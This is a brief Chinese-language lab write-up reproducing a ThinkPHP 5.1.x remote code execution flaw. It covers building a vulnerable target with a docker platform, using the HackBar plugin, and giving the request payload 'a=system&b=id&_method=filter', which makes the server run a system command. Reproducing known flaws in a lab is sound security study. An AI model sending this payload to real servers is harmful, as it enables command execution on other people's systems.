## Thinkphp5.1.x 远程漏洞执行漏洞复现

### 一、环境准备
使用vsplate(https://www.vsplate.com/new.php) 的docker快速搭建平台，填入github地址（eg. https://github.com/wdan-code/vuln） 即可快速搭建靶机

![image](https://user-images.githubusercontent.com/30569668/128801997-c5f8882d-ddeb-47c0-a170-e170854a8d7d.png)




### 二、工具准备
使用的Hacker(https://github.com/Mr-xn/hackbar2.1.3) 浏览器插件

![image](https://user-images.githubusercontent.com/30569668/128801110-dfbdd6b2-fe89-45de-a2ac-308379ee76d2.png)




### 三、复现过程
注：针对于这个版本有点鸡肋，需要index.php文件中跳过报错提示（我的github仓库已修改，直接拉取即可）
语句：error_reporting(0);
Payload：a=system&b=id&_method=filter

![image](https://user-images.githubusercontent.com/30569668/128801826-ef08cf34-b3f7-417a-82e6-0dc96ea6a671.png)
